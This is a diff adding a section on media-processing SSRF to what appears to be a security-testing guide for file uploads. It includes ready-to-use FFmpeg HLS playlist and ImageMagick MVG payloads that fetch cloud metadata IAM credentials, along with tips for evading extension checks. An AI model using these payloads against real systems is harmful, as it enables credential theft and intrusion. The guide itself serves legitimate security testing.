@@ -34,3 +34,37 @@ outside the intended directory, not just read outside it.
 - PDF JS/launch actions.
 - ImageTragick, polyglot JPEG/PNG/WebP with an embedded PHP payload.
 - EXIF data with a payload, ZIP archive symlink tricks.
+
+## Video/image-processing pipeline SSRF
+
+Any endpoint that shells out to `ffmpeg` or ImageMagick on an uploaded
+file is a candidate SSRF sink -- the file itself, not just its content,
+can instruct the processor to fetch an internal URL.
+
+- **FFmpeg HLS playlist SSRF** -- an uploaded `.m3u8` (or a video whose
+  processing pipeline touches HLS) can point a segment at an internal
+  URL:
+  ```
+  #EXTM3U
+  #EXT-X-MEDIA-SEQUENCE:0
+  #EXTINF:10.0,
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  #EXT-X-ENDLIST
+  ```
+- **FFmpeg concat-demuxer SSRF** -- the same trick via a concat file list
+  (`ffconcat version 1.0` + `file 'http://internal-host/path'`) instead
+  of a playlist; test both since some pipelines accept only one input
+  type.
+- **ImageMagick MVG SSRF** -- a crafted `.mvg` (Magick Vector Graphics)
+  file, or one renamed to `.jpg`/`.png` to slip past an extension check,
+  can trigger an outbound fetch during rendering:
+  ```
+  push graphic-context
+  viewbox 0 0 640 480
+  fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
+  pop graphic-context
+  ```
+
+Confirm via an OOB callback host in the URL, same as any other SSRF --
+see the `ssrf` skill's confirmation traps before claiming this as a
+finding.
